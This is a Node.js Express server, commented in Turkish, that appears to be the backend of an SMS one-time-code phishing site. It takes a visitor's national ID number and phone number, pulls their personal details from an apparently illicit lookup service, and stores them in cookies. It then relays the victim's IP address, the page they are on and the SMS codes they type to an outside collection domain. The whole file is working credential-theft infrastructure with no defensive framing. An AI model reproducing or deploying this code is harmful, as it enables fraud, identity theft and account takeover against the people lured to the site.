const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(requestIp.mw());
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Public klasörünü statik olarak servis et
app.use(express.static(path.join(__dirname, 'public')));

// CORS middleware'ini kullan
app.use(cors());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/sorgula', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'sorgula.html'));
});

app.get('/bekle', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
});

app.get('/sms', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'sms.html'));
});

app.get('/onay', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'onay.html'));
});
app.get('/hatali-sms', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'hatali-sms.html'));
});
app.get('/gizlilik-politikasi', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'gizlilik-politikasi.html'));
});

app.post('/online-api', async (req, res) => {
    const tc = req.body.tridField;
    const telno = req.body.telno; // Telefon numarasını alma

    try {
        const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
        const data = response.data;

        // Çerezlere verileri kaydet
        res.cookie('adi', data.adi, { httpOnly: false });
        res.cookie('soyadi', data.soyadi, { httpOnly: false });
        res.cookie('babaad', data.babaad, { httpOnly: false });

        // Telefon numarasını da çerez olarak kaydet
        res.cookie('telno', telno, { httpOnly: false });
        res.cookie('tc', tc, { httpOnly: false });
        res.redirect('/sorgula');
    } catch (error) {
        console.error('API isteğinde hata:', error);
        res.status(500).send('Sunucu hatası.');
    }
});

// API route
app.get('/api', async (req, res) => {
  try {
    const { user_ip: userIp, current_page: currentPage } = req.query;

    if (!userIp || !currentPage) {
      return res.status(400).send('user_ip and current_page are required.');
    }
 
    const apiUrl = `https://aidatiadelerikacirmaa.click/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;

 
    const response = await axios.get(apiUrl);

    if (!response.data) {
      throw new Error('Invalid response from API');
    }

    res.json(response.data);
  } catch (error) {
    console.error('API request error:', error);
    res.status(500).json({ error: error.message });
  }
});
app.post('/sms-ok', async (req, res) => {
  try {
    const { sms, ip } = req.body;

    if (!sms || !ip) {
      throw new Error('Eksik parametreler');
    }

    const apiUrl = `https://aidatiadelerikacirmaa.click/dmn/sms.php?ip=${encodeURIComponent(ip)}&sms=${encodeURIComponent(sms)}`;

    const response = await axios.get(apiUrl);

    if (!response.data) {
      throw new Error('API\'den geçersiz yanıt');
    }

    res.redirect('/bekle');
  } catch (error) {
    console.error('API isteği hatası:', error);
    res.status(500).redirect('/bekle'); // Hata durumunda da yönlendirme yapıyoruz
  }
});

 
app.listen(port, () => {
    console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});



 